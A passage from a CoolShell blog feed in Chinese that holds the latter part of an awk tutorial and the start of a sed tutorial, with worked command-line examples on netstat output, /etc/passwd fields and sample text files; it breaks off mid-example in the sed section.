<td bgcolor="#ffffff">当前记录数，与NR不同的是，这个值会是各个文件自己的行号</td>
</tr>
<tr>
<td bgcolor="#ffffff">RS</td>
<td bgcolor="#ffffff">输入的记录分隔符， 默认为换行符</td>
</tr>
<tr>
<td bgcolor="#ffffff">OFS</td>
<td bgcolor="#ffffff">输出字段分隔符， 默认也是空格</td>
</tr>
<tr>
<td bgcolor="#ffffff">ORS</td>
<td bgcolor="#ffffff">输出的记录分隔符，默认为换行符</td>
</tr>
<tr>
<td bgcolor="#ffffff">FILENAME</td>
<td bgcolor="#ffffff">当前输入文件的名字</td>
</tr>
</tbody>
</table>
<p>怎么使用呢，比如：我们如果要输出行号：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$3==0 &amp;&amp; $6=="ESTABLISHED" || NR==1 {printf "%02s %s %-20s %-20s %s\n",NR, FNR, $4,$5,$6}' netstat.txt
01 1 Local-Address        Foreign-Address      State
07 7 coolshell.cn:80      110.194.134.189:1032 ESTABLISHED
08 8 coolshell.cn:80      123.169.124.111:49809 ESTABLISHED
10 10 coolshell.cn:80      123.169.124.111:49829 ESTABLISHED
14 14 coolshell.cn:80      110.194.134.189:4796 ESTABLISHED
17 17 coolshell.cn:80      123.169.124.111:49840 ESTABLISHED</pre>
<h5>
<span class="ez-toc-section" id="%E6%8C%87%E5%AE%9A%E5%88%86%E9%9A%94%E7%AC%A6"></span><strong>指定分隔符</strong><span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$  awk  'BEGIN{FS=":"} {print $1,$3,$6}' /etc/passwd
root 0 /root
bin 1 /bin
daemon 2 /sbin
adm 3 /var/adm
lp 4 /var/spool/lpd
sync 5 /sbin
shutdown 6 /sbin
halt 7 /sbin</pre>
<p>上面的命令也等价于：（-F的意思就是指定分隔符）</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ awk -F: '{print $1,$3,$6}' /etc/passwd</code></p>
<p>注：如果你要指定多个分隔符，你可以这样来：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">awk -F '[;:]'</code></p>
<p>再来看一个以\t作为分隔符输出的例子（下面使用了/etc/passwd文件，这个文件是以:分隔的）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk  -F: '{print $1,$3,$6}' OFS="\t" /etc/passwd
root    0       /root
bin     1       /bin
daemon  2       /sbin
adm     3       /var/adm
lp      4       /var/spool/lpd
sync    5       /sbin</pre>
<h4>
<span class="ez-toc-section" id="%E8%84%B1%E6%8E%89%E8%A1%AC%E8%A1%AB"></span>脱掉衬衫<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D"></span>字符串匹配<span class="ez-toc-section-end"></span>
</h5>
<p>我们再来看几个字符串匹配的示例：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1,8">$ awk '$6 ~ /FIN/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt
1       Local-Address   Foreign-Address State
6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2
9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2
13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1
18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2

$ $ awk '$6 ~ /WAIT/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt
1       Local-Address   Foreign-Address State
5       coolshell.cn:80 124.205.5.146:18245     TIME_WAIT
6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2
9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2
11      coolshell.cn:80 183.60.215.36:36970     TIME_WAIT
13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1
15      coolshell.cn:80 183.60.212.163:51082    TIME_WAIT
18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2</pre>
<p>上面的第一个示例匹配FIN状态， 第二个示例匹配WAIT字样的状态。其实 ~ 表示模式开始。/ /中是模式。这就是一个正则表达式的匹配。</p>
<p>其实awk可以像grep一样的去匹配第一行，就像这样：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '/LISTEN/' netstat.txt
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
tcp        0      0 :::22                   :::*                    LISTEN</pre>
<p>我们可以使用 “/FIN|TIME/” 来匹配 FIN 或者 TIME :</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$6 ~ /FIN|TIME/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt
1       Local-Address   Foreign-Address State
5       coolshell.cn:80 124.205.5.146:18245     TIME_WAIT
6       coolshell.cn:80 61.140.101.185:37538    FIN_WAIT2
9       coolshell.cn:80 116.234.127.77:11502    FIN_WAIT2
11      coolshell.cn:80 183.60.215.36:36970     TIME_WAIT
13      coolshell.cn:80 124.152.181.209:26825   FIN_WAIT1
15      coolshell.cn:80 183.60.212.163:51082    TIME_WAIT
18      coolshell.cn:80 117.136.20.85:50025     FIN_WAIT2</pre>
<p>再来看看模式取反的例子：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk '$6 !~ /WAIT/ || NR==1 {print NR,$4,$5,$6}' OFS="\t" netstat.txt
1       Local-Address   Foreign-Address State
2       0.0.0.0:3306    0.0.0.0:*       LISTEN
3       0.0.0.0:80      0.0.0.0:*       LISTEN
4       127.0.0.1:9000  0.0.0.0:*       LISTEN
7       coolshell.cn:80 110.194.134.189:1032    ESTABLISHED
8       coolshell.cn:80 123.169.124.111:49809   ESTABLISHED
10      coolshell.cn:80 123.169.124.111:49829   ESTABLISHED
12      coolshell.cn:80 61.148.242.38:30901     ESTABLISHED
14      coolshell.cn:80 110.194.134.189:4796    ESTABLISHED
16      coolshell.cn:80 208.115.113.92:50601    LAST_ACK
17      coolshell.cn:80 123.169.124.111:49840   ESTABLISHED
19      :::22   :::*    LISTEN</pre>
<p>或是：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">awk '!/WAIT/' netstat.txt</code></p>
<p><strong>折分文件</strong></p>
<p>awk拆分文件很简单，使用重定向就好了。下面这个例子，是按第6例分隔文件，相当的简单（其中的NR!=1表示不处理表头）。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk 'NR!=1{print &gt; $6}' netstat.txt

$ ls
ESTABLISHED  FIN_WAIT1  FIN_WAIT2  LAST_ACK  LISTEN  netstat.txt  TIME_WAIT

$ cat ESTABLISHED
tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED
tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED
tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED

$ cat FIN_WAIT1
tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1

$ cat FIN_WAIT2
tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2
tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2
tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2

$ cat LAST_ACK
tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK

$ cat LISTEN
tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN
tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN
tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN
tcp        0      0 :::22                  :::*                        LISTEN

$ cat TIME_WAIT
tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT
tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT
tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT</pre>
<p>你也可以把指定的列输出到文件：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">awk 'NR!=1{print $4,$5 &gt; $6}' netstat.txt</code></p>
<p>再复杂一点：（注意其中的if-else-if语句，可见awk其实是个脚本解释器）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1,2,3">$ awk 'NR!=1{if($6 ~ /TIME|ESTABLISHED/) print &gt; "1.txt";
else if($6 ~ /LISTEN/) print &gt; "2.txt";
else print &gt; "3.txt" }' netstat.txt

$ ls ?.txt
1.txt  2.txt  3.txt

$ cat 1.txt
tcp        0      0 coolshell.cn:80        124.205.5.146:18245         TIME_WAIT
tcp        0      0 coolshell.cn:80        110.194.134.189:1032        ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49809       ESTABLISHED
tcp        0      0 coolshell.cn:80        123.169.124.111:49829       ESTABLISHED
tcp        0      0 coolshell.cn:80        183.60.215.36:36970         TIME_WAIT
tcp        0   4166 coolshell.cn:80        61.148.242.38:30901         ESTABLISHED
tcp        0      0 coolshell.cn:80        110.194.134.189:4796        ESTABLISHED
tcp        0      0 coolshell.cn:80        183.60.212.163:51082        TIME_WAIT
tcp        0      0 coolshell.cn:80        123.169.124.111:49840       ESTABLISHED

$ cat 2.txt
tcp        0      0 0.0.0.0:3306           0.0.0.0:*                   LISTEN
tcp        0      0 0.0.0.0:80             0.0.0.0:*                   LISTEN
tcp        0      0 127.0.0.1:9000         0.0.0.0:*                   LISTEN
tcp        0      0 :::22                  :::*                        LISTEN

$ cat 3.txt
tcp        0      0 coolshell.cn:80        61.140.101.185:37538        FIN_WAIT2
tcp        0      0 coolshell.cn:80        116.234.127.77:11502        FIN_WAIT2
tcp        0      1 coolshell.cn:80        124.152.181.209:26825       FIN_WAIT1
tcp        0      1 coolshell.cn:80        208.115.113.92:50601        LAST_ACK
tcp        0      0 coolshell.cn:80        117.136.20.85:50025         FIN_WAIT2</pre>
<h5>
<span class="ez-toc-section" id="%E7%BB%9F%E8%AE%A1"></span>统计<span class="ez-toc-section-end"></span>
</h5>
<p>下面的命令计算所有的C文件，CPP文件和H文件的文件大小总和。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ ls -l  *.cpp *.c *.h | awk '{sum+=$5} END {print sum}'
2511401</pre>
<p>我们再来看一个统计各个connection状态的用法：（我们可以看到一些编程的影子了，大家都是程序员我就不解释了。注意其中的数组的用法）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ awk 'NR!=1{a[$6]++;} END {for (i in a) print i ", " a[i];}' netstat.txt
TIME_WAIT, 3
FIN_WAIT1, 1
ESTABLISHED, 6
FIN_WAIT2, 3
LAST_ACK, 1
LISTEN, 4</pre>
<p>再来看看统计每个用户的进程的占了多少内存（注：sum的RSS那一列）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="1">$ ps aux | awk 'NR!=1{a[$1]+=$6;} END { for(i in a) print i ", " a[i]"KB";}'
dbus, 540KB
mysql, 99928KB
www, 3264924KB
root, 63644KB
hchen, 6020KB</pre>
<h4>
<span class="ez-toc-section" id="%E8%84%B1%E6%8E%89%E5%86%85%E8%A1%A3"></span>脱掉内衣<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="awk%E8%84%9A%E6%9C%AC"></span>awk脚本<span class="ez-toc-section-end"></span>
</h5>
<p>在上面我们可以看到一个END关键字。END的意思是“处理完所有的行的标识”，即然说到了END就有必要介绍一下BEGIN，这两个关键字意味着执行前和执行后的意思，语法如下：</p>
<ul>
<li>BEGIN{ 这里面放的是执行前的语句 }</li>
<li>END {这里面放的是处理完所有的行后要执行的语句 }</li>
<li>{这里面放的是处理每一行时要执行的语句}</li>
</ul>
<p>为了说清楚这个事，我们来看看下面的示例：</p>
<p>假设有这么一个文件（学生成绩表）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat score.txt
Marry   2143 78 84 77
Jack    2321 66 78 45
Tom     2122 48 77 71
Mike    2537 87 97 95
Bob     2415 40 57 62</pre>
<p>我们的awk脚本如下（我没有写有命令行上是因为命令行上不易读，另外也在介绍另一种用法）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat cal.awk
#!/bin/awk -f
#运行前
BEGIN {
    math = 0
    english = 0
    computer = 0

    printf "NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n"
    printf "---------------------------------------------\n"
}
#运行中
{
    math+=$3
    english+=$4
    computer+=$5
    printf "%-6s %-6s %4d %8d %8d %8d\n", $1, $2, $3,$4,$5, $3+$4+$5
}
#运行后
END {
    printf "---------------------------------------------\n"
    printf "  TOTAL:%10d %8d %8d \n", math, english, computer
    printf "AVERAGE:%10.2f %8.2f %8.2f\n", math/NR, english/NR, computer/NR
}</pre>
<p>我们来看一下执行结果：（也可以这样运行 ./cal.awk score.txt）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ awk -f cal.awk score.txt
NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL
---------------------------------------------
Marry  2143     78       84       77      239
Jack   2321     66       78       45      189
Tom    2122     48       77       71      196
Mike   2537     87       97       95      279
Bob    2415     40       57       62      159
---------------------------------------------
  TOTAL:       319      393      350
AVERAGE:     63.80    78.60    70.00</pre>
<h5>
<span class="ez-toc-section" id="%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"></span>环境变量<span class="ez-toc-section-end"></span>
</h5>
<p>即然说到了脚本，我们来看看怎么和环境变量交互：（使用-v参数和ENVIRON，使用ENVIRON的环境变量需要export）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="9">$ x=5

$ y=10
$ export y

$ echo $x $y
5 10

$ awk -v val=$x '{print $1, $2, $3, $4+val, $5+ENVIRON["y"]}' OFS="\t" score.txt
Marry   2143    78      89      87
Jack    2321    66      83      55
Tom     2122    48      82      81
Mike    2537    87      102     105
Bob     2415    40      62      72
</pre>
<h4>
<span class="ez-toc-section" id="%E5%87%A0%E4%B8%AA%E8%8A%B1%E6%B4%BB"></span>几个花活<span class="ez-toc-section-end"></span>
</h4>
<p>最后，我们再来看几个小例子：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#从file文件中找出长度大于80的行
awk 'length&gt;80' file

#按连接数查看客户端IP
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr

#打印99乘法表
seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i&lt;=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")}' </pre>
<h4>
<span class="ez-toc-section" id="%E8%87%AA%E5%B7%B1%E6%92%B8%E5%90%A7"></span>自己撸吧<span class="ez-toc-section-end"></span>
</h4>
<p>关于其中的一些知识点可以参看<a href="https://www.gnu.org/software/gawk/manual/gawk.html" target="_blank">gawk的手册</a>：</p>
<ul>
<li>内建变量，参看：<a href="https://www.gnu.org/software/gawk/manual/gawk.html#Built_002din-Variables" target="_blank">http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din-Variables</a>
</li>
<li>流控方面，参看：<a href="https://www.gnu.org/software/gawk/manual/gawk.html#Statements" target="_blank">http://www.gnu.org/software/gawk/manual/gawk.html#Statements</a>
</li>
<li>内建函数，参看：<a href="https://www.gnu.org/software/gawk/manual/gawk.html#Built_002din" target="_blank">http://www.gnu.org/software/gawk/manual/gawk.html#Built_002din</a>
</li>
<li>正则表达式，参看：<a href="https://www.gnu.org/software/gawk/manual/gawk.html#Regexp" target="_blank">http://www.gnu.org/software/gawk/manual/gawk.html#Regexp</a>
</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-02-17T08:38:29+08:00</pubDate>
<guid>https://coolshell.cn/articles/9070.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ sed 简明教程 ]]></title>
<link>https://coolshell.cn/articles/9104.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >awk于1977年出生，今年36岁本命年，sed比awk大2-3岁，awk就像林妹妹，sed就是宝玉哥哥了。所以 <a title="AWK 简明教程" href="https://coolshell.cn/articles/9070.html" target="_blank" rel="noopener noreferrer">林妹妹跳了个Topless</a>，他的哥哥sed坐不住了，也一定要出来抖一抖。</p>
<p>sed全名叫stream editor，流编辑器，用程序的方式来编辑文本，相当的hacker啊。sed基本上就是玩正则模式匹配，所以，玩sed的人，正则表达式一般都比较强。</p>
<p>同样，本篇文章不会说sed的全部东西，你可以参看<a href="https://www.gnu.org/software/sed/manual/sed.html" target="_blank" rel="noopener noreferrer">sed的手册</a>，我这里主要还是想和大家竞争一下那些从手机指缝间或马桶里流走的时间，用这些时间来学习一些东西。当然，接下来的还是要靠大家自己双手。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%94%A8s%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2" title="用s命令替换">用s命令替换</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%A4%9A%E4%B8%AA%E5%8C%B9%E9%85%8D" title="多个匹配">多个匹配</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%9C%86%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D" title="圆括号匹配">圆括号匹配</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-4" href="#sed%E7%9A%84%E5%91%BD%E4%BB%A4" title="sed的命令">sed的命令</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#N%E5%91%BD%E4%BB%A4" title="N命令">N命令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#a%E5%91%BD%E4%BB%A4%E5%92%8Ci%E5%91%BD%E4%BB%A4" title="a命令和i命令">a命令和i命令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#c%E5%91%BD%E4%BB%A4" title="c命令">c命令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#d%E5%91%BD%E4%BB%A4" title="d命令">d命令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#p%E5%91%BD%E4%BB%A4" title="p命令">p命令</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-10" href="#%E5%87%A0%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9" title="几个知识点">几个知识点</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#Pattern_Space" title="Pattern Space">Pattern Space</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#Address" title="Address">Address</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%91%BD%E4%BB%A4%E6%89%93%E5%8C%85" title="命令打包">命令打包</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#Hold_Space" title="Hold Space">Hold Space</a></li>
</ul>
</li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%94%A8s%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"></span>用s命令替换<span class="ez-toc-section-end"></span>
</h4>
<p>我使用下面的这段文本做演示：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat pets.txt
This is my cat
  my cat's name is betty
This is my dog
  my dog's name is frank
This is my fish
  my fish's name is george
This is my goat
  my goat's name is adam</pre>
<p>把其中的my字符串替换成Hao Chen’s，下面的语句应该很好理解（s表示替换命令，/my/表示匹配my，/Hao Chen’s/表示把匹配替换成Hao Chen’s，/g 表示一行上的替换所有的匹配）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed "s/my/Hao Chen's/g" pets.txt
This is Hao Chen's cat
  Hao Chen's cat's name is betty
This is Hao Chen's dog
  Hao Chen's dog's name is frank
This is Hao Chen's fish
  Hao Chen's fish's name is george
This is Hao Chen's goat
  Hao Chen's goat's name is adam</pre>
<p>注意：如果你要使用单引号，那么你没办法通过\’这样来转义，就有双引号就可以了，在双引号内可以用\”来转义。</p>
<p><span id="more-9104"></span></p>
<p>再注意：上面的sed并没有对文件的内容改变，只是把处理过后的内容输出，如果你要写回文件，你可以使用重定向，如：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ sed "s/my/Hao Chen's/g" pets.txt &gt; hao_pets.txt</code></p>
<p>或使用 -i 参数直接修改文件内容：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ sed -i "s/my/Hao Chen's/g" pets.txt</code></p>
<p>在每一行最前面加点东西：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/^/#/g' pets.txt
#This is my cat
#  my cat's name is betty
#This is my dog
#  my dog's name is frank
#This is my fish
#  my fish's name is george
#This is my goat
#  my goat's name is adam</pre>
<p>在每一行最后面加点东西：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/$/ --- /g' pets.txt
This is my cat ---
  my cat's name is betty ---
This is my dog ---
  my dog's name is frank ---
This is my fish ---
  my fish's name is george ---
This is my goat ---
  my goat's name is adam ---</pre>
<p>顺手介绍一下正则表达式的一些最基本的东西：</p>
<ul>
<li> <code>^</code> 表示一行的开头。如：<code>/^#/</code> 以#开头的匹配。</li>
<li> <code>$</code> 表示一行的结尾。如：<code>/}$/</code> 以}结尾的匹配。</li>
<li> <code>\&lt;</code> 表示词首。 如：<code>\&lt;abc</code> 表示以 abc 为首的詞。</li>
<li> <code>\&gt;</code> 表示词尾。 如：<code>abc\&gt;</code> 表示以 abc 結尾的詞。</li>
<li> <code>.</code> 表示任何单个字符。</li>
<li> <code>*</code> 表示某个字符出现了0次或多次。</li>
<li> <code>[ ]</code> 字符集合。 如：<code>[abc]</code> 表示匹配a或b或c，还有 <code>[a-zA-Z]</code> 表示匹配所有的26个字符。如果其中有^表示反，如 <code>[^a]</code> 表示非a的字符</li>
</ul>
<p>正规则表达式是一些很牛的事，比如我们要去掉某html中的tags：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">
&lt;b&gt;This&lt;/b&gt; is what &lt;span style="text-decoration: underline;"&gt;I&lt;/span&gt; meant. Understand?

</pre>
<p>看看我们的sed命令</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># 如果你这样搞的话，就会有问题
$ sed 's/&lt;.*&gt;//g' html.txt
 Understand?

# 要解决上面的那个问题，就得像下面这样。
# 其中的'[^&gt;]' 指定了除了&gt;的字符重复0次或多次。
$ sed 's/&lt;[^&gt;]*&gt;//g' html.txt
This is what I meant. Understand?</pre>
<p>我们再来看看指定需要替换的内容：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="4">$ sed "3s/my/your/g" pets.txt
This is my cat
  my cat's name is betty
This is your dog
  my dog's name is frank
This is my fish
  my fish's name is george
This is my goat
  my goat's name is adam</pre>
<p>下面的命令只替换第3到第6行的文本。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="4,5,6,7">$ sed "3,6s/my/your/g" pets.txt
This is my cat
  my cat's name is betty
This is your dog
  your dog's name is frank
This is your fish
  your fish's name is george
This is my goat
  my goat's name is adam</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ cat my.txt
This is my cat, my cat's name is betty
This is my dog, my dog's name is frank
This is my fish, my fish's name is george
This is my goat, my goat's name is adam</pre>
<p>只替换每一行的第一个s：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/s/S/1' my.txt
ThiS is my cat, my cat's name is betty
ThiS is my dog, my dog's name is frank
ThiS is my fish, my fish's name is george
ThiS is my goat, my goat's name is adam</pre>
<p>只替换每一行的第二个s：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/s/S/2' my.txt
This iS my cat, my cat's name is betty
This iS my dog, my dog's name is frank
This iS my fish, my fish's name is george
This iS my goat, my goat's name is adam</pre>
<p>只替换第一行的第3个以后的s：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/s/S/3g' my.txt
This is my cat, my cat'S name iS betty
This is my dog, my dog'S name iS frank
This is my fiSh, my fiSh'S name iS george
This is my goat, my goat'S name iS adam</pre>
<h4>
<span class="ez-toc-section" id="%E5%A4%9A%E4%B8%AA%E5%8C%B9%E9%85%8D"></span>多个匹配<span class="ez-toc-section-end"></span>
</h4>
<p>如果我们需要一次替换多个模式，可参看下面的示例：（第一个模式把第一行到第三行的my替换成your，第二个则把第3行以后的This替换成了That）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed '1,3s/my/your/g; 3,$s/This/That/g' my.txt
This is your cat, your cat's name is betty
This is your dog, your dog's name is frank
That is your fish, your fish's name is george
That is my goat, my goat's name is adam</pre>
<p>上面的命令等价于：（注：下面使用的是sed的-e命令行参数）</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">sed -e '1,3s/my/your/g' -e '3,$s/This/That/g' my.txt</code></p>
<p>我们可以使用&amp;来当做被匹配的变量，然后可以在基本左右加点东西。如下所示：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/my/[&amp;]/g' my.txt
This is [my] cat, [my] cat's name is betty
This is [my] dog, [my] dog's name is frank
This is [my] fish, [my] fish's name is george
This is [my] goat, [my] goat's name is adam</pre>
<h4>
<span class="ez-toc-section" id="%E5%9C%86%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D"></span>圆括号匹配<span class="ez-toc-section-end"></span>
</h4>
<p>使用圆括号匹配的示例：（圆括号括起来的正则表达式所匹配的字符串会可以当成变量来使用，sed中使用的是\1,\2…）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 's/This is my \([^,&amp;]*\),.*is \(.*\)/\1:\2/g' my.txt
cat:betty
dog:frank
fish:george
goat:adam</pre>
<p>上面这个例子中的正则表达式有点复杂，解开如下（去掉转义字符）：</p>
<p>正则为：This is my ([^,]*),.*is (.*)<br>
匹配为：This is my (cat),……….is (betty)</p>
<p>然后：\1就是cat，\2就是betty</p>
<h4>
<span class="ez-toc-section" id="sed%E7%9A%84%E5%91%BD%E4%BB%A4"></span>sed的命令<span class="ez-toc-section-end"></span>
</h4>
<p>让我们回到最一开始的例子pets.txt，让我们来看几个命令：</p>
<h5>
<span class="ez-toc-section" id="N%E5%91%BD%E4%BB%A4"></span>N命令<span class="ez-toc-section-end"></span>
</h5>
<p>先来看N命令 —— 把下一行的内容纳入当成缓冲区做匹配。</p>
<p>下面的的示例会把原文本中的偶数行纳入奇数行匹配，而s只匹配并替换一次，所以，就成了下面的结果：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 'N;s/my/your/' pets.txt
This is your cat
  my cat's name is betty
This is your dog
  my dog's name is frank
This is your fish
  my fish's name is george
This is your goat
  my goat's name is adam</pre>
<p>也就是说，原来的文件成了：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">This is my cat\n  my cat's name is betty
This is my dog\n  my dog's name is frank
This is my fish\n  my fish's name is george
This is my goat\n  my goat's name is adam</pre>
<p>这样一来，下面的例子你就明白了，</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ sed 'N;s/\n/,/' pets.txt
This is my cat,  my cat's name is betty
This is my dog,  my dog's name is frank
This is my fish,  my fish's name is george
This is my goat,  my goat's name is adam</pre>
<h5>
<span class="ez-toc-section" id="a%E5%91%BD%E4%BB%A4%E5%92%8Ci%E5%91%BD%E4%BB%A4"></span>a命令和i命令<span class="ez-toc-section-end"></span>
</h5>
<p>a命令就是append， i命令就是insert，它们是用来添加行的。如：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW" data-enlighter-highlight="2,12"># 其中的1i表明，其要在第1行前插入一行（insert）
